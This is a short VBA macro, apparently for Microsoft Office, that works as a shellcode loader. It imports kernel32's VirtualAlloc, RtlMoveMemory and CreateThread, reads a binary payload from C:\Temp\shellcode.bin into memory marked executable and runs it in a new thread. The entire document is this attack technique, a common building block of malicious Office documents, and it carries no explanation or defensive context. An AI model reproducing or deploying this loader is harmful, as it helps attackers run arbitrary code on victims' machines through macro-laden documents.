Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long) As Long
Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As LongPtr

Sub RunShellcode()
    Dim sc() As Byte
    Dim addr As LongPtr
    
    sc = ReadBinFile("C:\Temp\shellcode.bin")
    
    addr = VirtualAlloc(0, UBound(sc) + 1, &H1000 Or &H2000, &H40)
    
    RtlMoveMemory addr, sc(0), UBound(sc) + 1
    
    CreateThread 0, 0, addr, 0, 0, 0
End Sub

Function ReadBinFile(filePath As String) As Byte()
    Dim fileNum As Integer
    Dim fileSize As Long
    Dim fileData() As Byte
    
    fileNum = FreeFile
    Open filePath For Binary As #fileNum
    fileSize = LOF(fileNum)
    ReDim fileData(fileSize - 1)
    Get #fileNum, , fileData
    Close #fileNum
    
    ReadBinFile = fileData
End Function

